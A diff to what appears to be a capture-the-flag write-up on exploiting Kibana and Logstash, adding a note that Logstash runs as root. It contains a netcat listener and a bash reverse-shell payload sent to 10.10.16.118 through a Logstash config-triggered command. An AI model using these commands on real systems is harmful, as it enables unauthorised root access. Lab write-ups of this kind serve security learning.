@@ -212,6 +212,8 @@ $ curl "http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSI
 `nc -lvp 33234`, Get a reverse shell as Kibana.
 
 ```
+$ whoami
+kibana
 $ pwd
 /etc/logstash/conf.d
 $ cat ./*.conf
@@ -242,7 +244,7 @@ output {
 }
 ```
 
-Logstash collects unstructured data from log files and other sources, converts it into structured data, and inserts it into elasticsearch. According to the config, we build payload using this command: `echo 'Ejecutar comando : /bin/bash -i >& /dev/tcp/10.10.16.118/33938 0>&1' > /opt/kibana/logstash_sht2a`
+Logstash(running by root) collects unstructured data from log files and other sources, converts it into structured data, and inserts it into elasticsearch. Executing the command is running by Logstash. According to the config, we build payload using this command: `echo 'Ejecutar comando : /bin/bash -i >& /dev/tcp/10.10.16.118/33938 0>&1' > /opt/kibana/logstash_sht2a`
 
 Then access `http://10.10.10.115:9200/*` to let the elasticsearch refresh its data, then wait about 10s.
 
